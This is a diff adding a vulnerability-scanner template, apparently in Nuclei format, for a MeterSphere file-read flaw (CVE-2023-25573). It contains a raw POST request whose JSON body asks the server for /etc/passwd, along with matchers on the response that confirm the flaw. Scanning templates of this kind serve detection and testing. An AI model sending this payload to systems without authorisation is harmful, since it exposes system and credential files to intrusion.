@@ -1,0 +1,28 @@
+id: metersphere-files-fileread
+
+info:
+  name: metersphere-files-fileread
+  author: HuanXiong
+  severity: medium
+  description: CVE-2023-25573
+
+  tags: File Reading
+
+http:
+  - raw:
+      - |
+        POST /api/jmeter/download/files HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"reportId":"pass","bodyFiles":[{"id":"aaa","name":"/etc/passwd"}]}
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "pass.zip"
+        part: header
+      - type: status
+        status:
+          - 200
